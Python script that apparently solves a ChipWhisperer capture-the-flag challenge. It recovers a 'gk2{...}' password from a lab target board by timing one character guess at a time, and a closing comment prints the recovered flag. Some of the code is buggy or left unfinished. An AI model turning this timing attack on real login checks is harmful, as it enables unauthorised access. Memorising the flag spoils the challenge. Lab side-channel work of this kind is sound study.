import chipwhisperer as cw
import matplotlib.pyplot as plt
from string import ascii_lowercase, ascii_uppercase, digits
import time


scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)


def reset_target(scope):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.05)


def guess(password):
    start = time.perf_counter()
    target.simpleserial_write('b', password)
    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    if response == b"\x00":
        response = 0
    elif response ==b"x\01":
        response = 1
    else:
        response = 2
    timing = end - start
    return response, timing


def main():
    scope.default_setup()

    inside = b"7rU3nc"

    # for _ in range(12 - len(inside)):
    for _ in range(100):
        timing = 0
        letter = ""

        prefix = b"gk2{"
        suffix = b"}"
        padding = (11 - len(inside)) * b"0"

        for tmp_letter in ascii_lowercase + digits + ascii_uppercase:
            password = prefix + inside + tmp_letter.encode() + padding + suffix
            response, tmp_timing = guess(password)
            print(f"{password} {response} {tmp_timing}")
            if tmp_timing > timing:
                timing = tmp_timing
                letter = tmp_letter

        # inside += letter.encode()
        # print(prefix + inside + letter. encode() + suffix)
    
    password = prefix + inside + suffix
    response, _ = guess(password)
    print(f"Got: {response} for Password: {password.decode()}")

    target.simpleserial_write('q', b"0")
    response = target.simpleserial_read('r', 4)
    if response is not None:
        print(f"Number of Queries (cumulative): {int.from_bytes(response, byteorder='little', signed=False)}") #number of queries since powerup


if __name__ == "__main__":
    main()

# n
# Q
# t
# 1
# L
# g
# n
# y
# B
# 2
# I
# 3
# 3
# o
# y
# 9
# 0
# C
# z
# J
# v
# p
# o
# N
# p
# X
# G
# V
# V
# z
# y
# d
# Q
# I
# s
# f
# U
# L
# g
# H
# E
# G
# k
# u
# w
# d
# H
# 6
# J
# t
# M
# 8
# E
# c
# 7
# x
# 3
# N
# w
# T
# P
# A
# F
# i
# R
# v
# L
# e
# 6
# v
# B
# p
# X
# s
# m
# z
# z
# 7
# Y
# 8
# g
# c
# s
# v
# 3
# p
# B
# E
# S
# n

# gk2{7rU3ncg8GMlc}

# ["d", "g", "h", "p", "4", "6", "8", "B", "L"]
